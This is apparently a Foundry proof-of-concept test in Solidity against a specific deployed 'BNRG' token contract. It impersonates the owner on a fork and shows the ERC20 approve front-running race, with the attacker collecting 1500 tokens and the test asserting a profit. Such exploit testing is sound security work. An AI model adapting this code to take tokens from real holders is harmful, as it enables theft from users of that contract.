// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface BNRG {
    function owner() external view returns (address);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function setBotProtection(bool enable) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to impersonate the owner to change state and get tokens
        address owner = BNRG(TARGET).owner();
        vm.startPrank(owner);
        // Unlock the contract to allow transfers
        BNRG(TARGET).setBotProtection(false); // This sets state to Unlocked
        vm.stopPrank();

        // Label addresses for clarity
        vm.label(TARGET, "BNRG Token");
        vm.label(owner, "Token Owner");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C).balanceOf(address(this));
        // Step 1: Get owner address
        address owner = BNRG(TARGET).owner();

        // Step 2: Owner approves attacker for initial amount X (1000 tokens)
        vm.prank(owner);
        BNRG(TARGET).approve(attacker, 1000 * 10**18);

        // Record initial attacker balance for verification
        uint256 attackerInitialBalance = BNRG(TARGET).balanceOf(attacker);

        // Step 3 & 4: Simulate race condition
        // In a real scenario, attacker would front-run victim's reduction
        // Here we simulate by controlling transaction order

        // First, attacker transfers the initial allowance (1000 tokens)
        // This simulates front-running the reduction
        BNRG(TARGET).transferFrom(owner, attacker, 1000 * 10**18);

        // Step 5: Owner reduces approval to Y (500 tokens)
        // This happens after attacker's transferFrom
        vm.prank(owner);
        BNRG(TARGET).approve(attacker, 500 * 10**18);

        // Step 6: Attacker uses the remaining allowance (500 tokens)
        BNRG(TARGET).transferFrom(owner, attacker, 500 * 10**18);

        // Step 7: Verify attacker gained 1500 tokens total
        uint256 finalBalance = BNRG(TARGET).balanceOf(attacker);
        assertGt(finalBalance, attackerInitialBalance, "Attacker balance should increase");

        // Calculate exact profit
        uint256 profit = finalBalance - attackerInitialBalance;
        console.log("Profit gained:", profit / 10**18, "BNRG");
        console.log("Expected profit: 1500 BNRG");
        uint256 finalErc20Balance = IERC20(0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C).balanceOf(address(this));
        assertGt(finalErc20Balance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
